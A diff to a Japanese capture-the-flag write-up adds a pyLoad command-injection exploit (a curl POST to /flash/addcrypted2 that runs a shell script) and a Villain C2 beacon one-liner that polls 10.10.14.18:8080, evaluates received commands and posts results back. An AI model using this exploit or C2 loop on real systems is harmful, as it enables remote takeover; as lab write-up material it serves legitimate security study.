@@ -44,12 +44,27 @@ command injectionの脆弱性が見つかりました(<https://github.com/bAuh0l
 <br>
 ## 攻撃スクリプトの作成
 pyLoadの脆弱性を利用した攻撃では、reverse-shellを使います。今回は２つのスクリプトを作ります。<br>
+### /tmp/exploit.sh
+```
+curl -i -s -k -X $'POST' \
+    --data-binary $'jk=pyimport%20os;os.system(\"bash%20/tmp/exploit.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
+    $'http://127.0.0.1:8000/flash/addcrypted2'
+```
+<br>
+
+### ~/exploit.sh
+```
+nohup bash -c 's=10.10.14.18:8080&&i=018583-c27fed-8677af&&hname=$(hostname)&&p=http://;curl -s "$p$s/018583/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/c27fed" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/8677af -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;' & disown
+```
+<br>
 1つ目のスクリプトはpyLoadに/tmp/exploit.shを実行させるスクリプトです。<br>
 ２つ目のスクリプトは自分のPCで動かしているC2サーバーにアクセスさせるスクリプトです。<br>
 今回はC2サーバーにVillain(<https://github.com/t3l3machus/Villain>)を使っています。<br>
 <br>
 <br>
+
 ## 侵入2
 実際に作成したスクリプトを実行してみましょう。<br>
+![establishing_session](https://github.com/sota70/PC-Easy-Writeup/assets/46929379/44e2d6b9-4b47-478b-a654-86b39c94fa4d)
 そうすると無事セッションが確立できました。<br>
 rootディレクトリに行ってみると２個目のフラグがあったので、これでPCは終わりです。
